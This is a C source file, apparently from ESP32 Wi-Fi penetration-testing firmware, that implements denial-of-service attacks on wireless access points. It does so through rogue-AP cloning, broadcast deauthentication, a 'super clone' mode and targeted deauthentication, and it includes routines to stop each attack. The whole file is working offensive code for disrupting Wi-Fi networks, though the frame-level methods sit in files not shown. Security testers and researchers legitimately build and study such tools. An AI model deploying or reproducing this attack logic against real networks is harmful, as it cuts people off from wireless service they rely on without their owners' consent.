/**
 * @file attack_dos.c
 * @author risinek (risinek@gmail.com), SameerAlSahab (sameeralsahab54@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements DoS attacks using deauthentication methods
 */

#include "attack_dos.h"

#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"

#include "attack.h"
#include "attack_method.h"
#include "wifi_controller.h"


static const char *TAG = "main:attack_dos";
static attack_dos_methods_t method = -1;

void attack_dos_start(attack_config_t *attack_config) {
    ESP_LOGI(TAG, "Starting DoS attack on %d targets...", attack_config->target_count);
    method = attack_config->method;

    attack_method_set_intensity(attack_config->intensity);

    switch (method) {
        case ATTACK_DOS_METHOD_BROADCAST:
        case ATTACK_DOS_METHOD_TARGETED:
            wifictl_mgmt_ap_stop();
            break;
        default:
            break;
    }

    if (method == ATTACK_DOS_METHOD_TARGETED) {
        attack_method_targeted_start(attack_config->ap_records,
                                     attack_config->target_count,
                                     attack_config->intensity);
        return;
    }

    for(int i = 0; i < attack_config->target_count; i++) {
        const wifi_ap_record_t *ap_record = attack_config->ap_records[i];

        switch(method) {
            case ATTACK_DOS_METHOD_ROGUE_AP:
                attack_method_rogueap(ap_record);
                break;
            case ATTACK_DOS_METHOD_BROADCAST:
                attack_method_broadcast(ap_record, 1);
                break;
            case ATTACK_DOS_METHOD_SUPER_CLONE:
                attack_method_rogueap(ap_record);
                attack_method_super_clone(ap_record);
                break;
            case ATTACK_DOS_METHOD_TARGETED:
                /* handled before this loop via attack_method_targeted_start() */
                break;
        }
    }
}

void attack_dos_stop() {
    switch(method){
        case ATTACK_DOS_METHOD_ROGUE_AP:
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_BROADCAST:
            attack_method_broadcast_stop();
            break;
        case ATTACK_DOS_METHOD_SUPER_CLONE:
            attack_method_super_clone_stop();
            wifictl_mgmt_ap_start();
            wifictl_restore_ap_mac();
            break;
        case ATTACK_DOS_METHOD_TARGETED:
            attack_method_targeted_stop();
            wifictl_mgmt_ap_start();
            break;
        default:
            ESP_LOGE(TAG, "Unknown attack method! Attack may not be stopped properly.");
    }
    /* Restore default intensity so later attacks (e.g. handshake capture, which
     * also uses attack_method_broadcast) aren't affected by the DoS setting. */
    attack_method_set_intensity(1);
    ESP_LOGI(TAG, "DoS attack stopped");
}
